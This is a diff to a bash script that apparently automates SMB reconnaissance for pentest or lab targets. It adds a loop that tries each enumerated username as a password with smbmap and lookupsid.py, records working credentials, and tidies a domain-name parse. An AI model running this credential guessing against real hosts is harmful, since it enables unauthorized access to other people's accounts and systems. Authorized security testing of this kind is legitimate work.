@@ -523,16 +523,28 @@ while IFS=: read -r ligne
           if [ "$(cat ${boxe_path}/smbrecon/enum-users.txt | grep 'user:' | cut -d'[' -f 2 | cut -d']' -f 1 )" != "" ]; then
             cat ${boxe_path}/smbrecon/enum-users.txt | grep 'user:' | cut -d'[' -f 2 | cut -d']' -f 1 > ${boxe_path}/smbrecon/users.txt
             for user in $(cat ${boxe_path}/smbrecon/users.txt); do 
-              # If we have any password fro enum4linux
+              # try usernames as passwords
+              for pass in $(cat ${boxe_path}/smbrecon/users.txt)
+                 do 
+                   if [ "$(smbmap -u $user -p $pass -H $ip | grep 'Authentication error')" =  "" ]; then
+                     echo "\$ smbmap -u $user -p '$pass' -H $ip "  | tee -a ${boxe_path}/smbrecon/smbrecon_${port}.txtPass$user
+                     smbmap -u $user -p $pass -H $ip   >>  ${boxe_path}/smbrecon/smbrecon_${port}.txtPass$user
+                   fi
+                   if [ "$(lookupsid.py ${user}:${pass}@${ip}  | grep -i 'error')" =  "" ]; then
+                     echo "\$ lookupsid.py '${user}:${pass}'@${ip}"  | tee -a  ${boxe_path}/smbrecon/smbrecon_${port}.txtIPC1$user
+                     lookupsid.py ${user}:${pass}@${ip}    >>  ${boxe_path}/smbrecon/smbrecon_${port}.txtIPC1$user
+                   fi      
+                 done
+              # If we have any password from enum4linux
               if [ "$(cat ${boxe_path}/smbrecon/enum-users.txt | grep -i 'password set to')" != "" ]; then 
                 for pass in $(cat ${boxe_path}/smbrecon/enum-users.txt | grep -i 'password set to' | sed  's/Password set to /&>/' | cut -d'>' -f 2 )
                  do 
                    if [ "$(smbmap -u $user -p $pass -H $ip | grep 'Authentication error')" =  "" ]; then
-                     echo "\$ smbmap -u $user -p '$pass' -H $ip "  | tee ${boxe_path}/smbrecon/smbrecon_${port}.txtPass$user
+                     echo "\$ smbmap -u $user -p '$pass' -H $ip "  | tee -a ${boxe_path}/smbrecon/smbrecon_${port}.txtPass$user
                      smbmap -u $user -p $pass -H $ip   >>  ${boxe_path}/smbrecon/smbrecon_${port}.txtPass$user
                    fi
                    if [ "$(lookupsid.py ${user}:${pass}@${ip}  | grep -i 'error')" =  "" ]; then
-                     echo "\$ lookupsid.py '${user}:${pass}'@${ip}"  >  ${boxe_path}/smbrecon/smbrecon_${port}.txtIPC1$user
+                     echo "\$ lookupsid.py '${user}:${pass}'@${ip}"  | tee -a  ${boxe_path}/smbrecon/smbrecon_${port}.txtIPC1$user
                      lookupsid.py ${user}:${pass}@${ip}    >>  ${boxe_path}/smbrecon/smbrecon_${port}.txtIPC1$user
                    fi      
                  done
@@ -573,6 +585,9 @@ while IFS=: read -r ligne
         domain="$(cat $f_oports | grep '445/tcp' | grep workgroup | cut -d':' -f2 | cut -d')' -f1)"
         if [ "$domain" = "" ]; then
           domain="$(cat $f_oports | grep -i ldap -m 1 | cut -d':' -f 2 | cut -d',' -f 1)"
+          if [ "$domain" != "" ] &&  [ "$(echo $domain | grep '0\.$' )" != "" ]; then
+            domain="$(echo $domain | sed 's/^\(.*\)../\1/')"
+          fi	  
         fi
         if [ "$domain" = "" ]; then
           domain="$(enum4linux -a $ip 2>/dev/null | grep 'Domain Name' -m 1 | cut -d ':' -f 2)"
